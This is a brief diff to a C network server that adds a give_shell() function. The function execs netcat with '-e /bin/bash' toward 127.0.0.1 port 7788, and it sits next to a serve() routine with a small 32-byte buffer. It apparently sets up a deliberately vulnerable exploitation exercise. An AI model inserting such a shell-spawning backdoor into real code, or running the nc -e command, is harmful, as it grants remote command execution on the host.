@@ -7,6 +7,15 @@
 #include <netinet/tcp.h>
 #include <sys/wait.h>
 
+const char *shell_path = "/usr/bin/nc";
+char *shell_argv[] = {"nc", "127.0.0.1", "7788", "-e", "/bin/bash"};
+char **shell_envp = NULL;
+
+void give_shell(void)
+{
+        execve(shell_path, shell_argv, shell_envp);
+}
+
 void serve(int sock)
 {
         char buffer[32];
